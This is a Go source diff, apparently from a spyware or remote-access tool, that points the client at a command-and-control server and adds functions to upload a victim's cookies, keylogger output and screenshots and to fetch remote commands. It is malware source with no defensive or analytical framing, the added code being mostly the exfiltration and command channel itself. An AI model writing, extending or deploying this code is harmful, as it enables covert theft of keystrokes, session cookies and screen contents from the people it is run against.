@@ -1,4 +1,4 @@
-package network
+package utils
 
 import (
 	"bytes"
@@ -9,7 +9,7 @@ import (
 	"time"
 )
 
-const Url = "http://10.152.2.119:8080"
+const Url = "http://192.168.1.6:8080"
 
 type ErrorCode int
 
@@ -61,6 +61,26 @@ func HandleTextRequest(body, path, victim string) (map[string]string, error) {
 	return decoded, nil
 }
 
+func HandleOwnerRequest(body, victim string) (map[string]string, error) {
+	return HandleTextRequest(body, "owner", victim)
+}
+
+func HandleCookieRequest(body, victim string) (map[string]string, error) {
+	return HandleTextRequest(body, "cookies", victim)
+}
+
+func HandleLazyKeylogRequest(body, victim string) (map[string]string, error) {
+	return HandleTextRequest(body, "lazyKeylog", victim)
+}
+
+func HandleKeylogRequest(body, victim string) (map[string]string, error) {
+	return HandleTextRequest(body, "/", victim)
+}
+
+func HandleCommandsRequest(victim string) (map[string]string, error) {
+	return HandleTextRequest("", "commands", victim)
+}
+
 func HandleImageRequest(body []byte, path, victim string) (map[string]string, error) {
 	resp, err := SendImageToServer(body, path, victim)
 	if err != nil {
@@ -74,9 +94,13 @@ func HandleImageRequest(body []byte, path, victim string) (map[string]string, er
 	return decoded, nil
 }
 
+func HandleScreenshotRequest(body []byte, victim string) (map[string]string, error) {
+	return HandleImageRequest(body, "screenshot", victim)
+}
+
 func EstablishConnection(name string) {
 	for {
-		_, err := HandleTextRequest("", "owner", name)
+		_, err := HandleOwnerRequest("", name)
 		if err != nil {
 			fmt.Println(err)
 			time.Sleep(3 * time.Second)
@@ -84,4 +108,8 @@ func EstablishConnection(name string) {
 			break
 		}
 	}
+}
+
+func HandleError(err, victim string) {
+	SendTextToServer(err, "error", victim)
 }
